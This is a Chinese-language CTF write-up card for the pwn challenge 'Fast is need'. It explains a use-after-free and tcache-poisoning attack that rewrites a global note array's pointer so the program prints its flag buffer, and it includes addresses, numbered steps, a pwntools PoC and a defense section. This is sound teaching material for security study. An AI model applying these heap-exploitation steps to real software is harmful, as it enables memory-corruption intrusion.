---
id: ctf-pwn-tcache-poison-global-note-array-flagbuf-print
title: tcache poisoning 改写全局 note 数组元数据：借相邻 size 字段伪造 chunk，把 data 指向 flagbuf 直接打印
type: scenario
domain: ctf
path: ctf/pwn
technique: tcache-poison-global-note-array-flagbuf
tags:
- pwn
- heap
- tcache
- poisoning
- uaf
- global-array
- format-string
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-06'
verification:
  verified_by: verifier-V115
  verified_at: '2026-11-06T01:48:29+08:00'
  notes: 已对照原文 Fast is need 核对：struct note 0x18、notes=0x6020e0/flagbuf=0x6021a0、delete 只清 used 不清 data、双指针 UAF、tcache next 写 &notes[5].data=0x602160、create(5,0x51) 提供伪 chunk size、pre-safe-linking tcache、show printf(flagbuf) 均一致；原文有实测 flag，未本机复跑。
url: /docs/ctf/pwn/ctf-pwn-tcache-poison-global-note-array-flagbuf-print/
draft: false
kb_aliases:
- Fast is need
- tcache 改全局 notes
- note 元数据劫持
- flagbuf 直接打印
- UAF 双指针 tcache poisoning
---

## 一句话结论

菜单式 note 程序在 `delete` 后只清 `used` 不清 `data`，配合“先释放 note0、再让 note1 拿回同一块、再释放 note0”即可得到指向已释放 chunk 的可写别名；用 `edit(1)` 改写 tcache `next`，让后续 `malloc(0x40)` 返回全局 `notes[5].data` 的地址，写入 `flagbuf` 指针与 `used=1`，最后 `show(5)` 的 `printf` 直接打印 `flagbuf`。

## 原理

- **对象布局**：`struct note { size_t size; char *data; int used; }`，`notes[MAX]` 与 `flagbuf[256]` 都在 .bss；程序启动时 `load_flag()` 把 `/opt/chal/flag.txt` 读入 `flagbuf`，因此不需要 getshell，只要让 `show()` 打印 `flagbuf`。
- **UAF 双指针**：`delete` 只设置 `used=0`，不把 `data` 置空；先 `create(0)`，`delete(0)`，再 `create(1)` 让 note1 拿回同一块 chunk，此时 note0 与 note1 的 `data` 指向同一块内存；再 `delete(0)`，note1 仍 `used=1` 但指向已释放 chunk，`edit(1)` 就能改写该 chunk 的 tcache `next`。
- **tcache poisoning**：远程为 pre-safe-linking tcache，`next` 直接写目标用户指针即可，不需要异或堆地址。把 `next` 改成 `&notes[5].data`，连续两次 `create(0x40)` 后，第二次 `malloc` 返回该地址，写入的数据覆盖 `notes[5].data` 与 `notes[5].used`。
- **伪造 chunk size**：先 `create(5, 0x51)`，使 `notes[5].size = 0x51` 位于目标指针前 8 字节，充当“块头 size”字段，让 tcache 认为目标处是一个合法 0x50 chunk。
- **打印 sink**：`show()` 执行 `printf(notes[idx].data)`，直接把 `data` 当格式串；把 `notes[5].data` 改成 `flagbuf` 后，`show(5)` 输出 `flagbuf`（flag 中不含 `%` 时就是普通字符串打印）。
- **地址计算**：`notes = 0x6020e0`，`flagbuf = 0x6021a0`，`struct note` 大小 0x18，`notes[5].data = notes + 5*0x18 + 8 = 0x602160`。

## 触发条件

- note/菜单类程序存在 UAF（释放后指针未清空）且允许重复释放/重新分配同一 size class。
- 使用 tcache 且未开启 safe-linking（或无堆地址异或保护）。
- 目标全局数组/结构体在 .bss 固定地址（非 PIE），且其字段布局可被伪造 chunk 利用。
- 存在把全局缓冲区交给 `printf`/`puts`/`write` 的 sink，或目标数据本身含 flag。

## 利用步骤

1. 侦察：用格式串泄漏确认远程非 PIE、固定代码地址；确认 `notes`/`flagbuf` 地址与 `struct note` 布局（可由源码/本地编译符号推算）。
2. `create(5, 0x51)`，把 `notes[5].size` 设为 0x51，作为目标伪 chunk 的 size。
3. `create(0, 0x40)`，`delete(0)`，让 0x50 tcache bin 有一个 chunk。
4. `create(1, 0x40)` 拿回同一 chunk；`delete(0)` 再次释放，note1 成为指向 freed chunk 的活指针。
5. `edit(1, p64(&notes[5].data))`，改写 tcache `next`。
6. `create(2, 0x40)` 取走真实 chunk；`create(3, 0x40)` 返回 `&notes[5].data`。
7. 向 note3 写入 `p64(flagbuf) + p32(1)`，覆盖 `notes[5].data` 与 `used`。
8. `show(5)` 打印 `flagbuf`。

## PoC

```python
from pwn import *

notes   = 0x6020e0
flagbuf = 0x6021a0

create(io, 5, 0x51, b"S" * 8)     # 伪 chunk size
create(io, 0, 0x40, b"A" * 8)
delete(io, 0)
create(io, 1, 0x40, b"B" * 8)     # note1 拿回 note0 的 chunk
delete(io, 0)                     # note1 成为 dangling 活指针

target = notes + 5 * 0x18 + 0x8   # &notes[5].data
edit(io, 1, p64(target))

create(io, 2, 0x40, b"C" * 8)
create(io, 3, 0x40, p64(flagbuf) + p32(1))  # 覆盖 notes[5].data/used
print(show(io, 5))
```

原文在远程（非 PIE、pre-safe-linking tcache）成功打印 `flagbuf`；未在本机复跑。

## 变体与关联

- **目标变体**：全局函数指针表、GOT（无 RELRO）、atexit 数组、命令缓冲区；本卡选择“改 note 元数据读全局 flagbuf”，避免依赖 libc/hook。
- **size 伪造变体**：目标地址前 8 字节若不是合法 size，可先用其他字段/写原语布置 size；或选择目标前恰好有可控 size 字段的结构。
- **safe-linking 变体**：开启 safe-linking 后 `next` 需写成 `(target >> 12) ^ chunk_addr`，需要先泄漏堆地址或使用同页自异或技巧。
- **关联**：[[binary-pwn-heap-safe-linking-self-xor-heap-address]]（safe-linking 堆地址恢复）、[[binary-pwn-heap-glibc243-tcache-key-bypass-got-system]]（tcache 改 GOT）；本卡强调“改全局结构体元数据 + 相邻 size 字段伪 chunk”。

## 检测与防御

- 释放后把指针置空并清 `used`；删除/编辑前校验索引与状态；避免同一 chunk 被多个 note 引用。
- 启用 safe-linking、tcache key、RELRO/PIE；把全局 flag 缓冲区放在不可被堆分配命中的独立映射。
- `printf` 使用 `printf("%s", data)`，禁止把用户数据当格式串。
- 检测：tcache `next` 指向 .bss/.data、`malloc` 返回非堆地址、全局结构体字段被异常改写、`show` 出现非预期格式串。
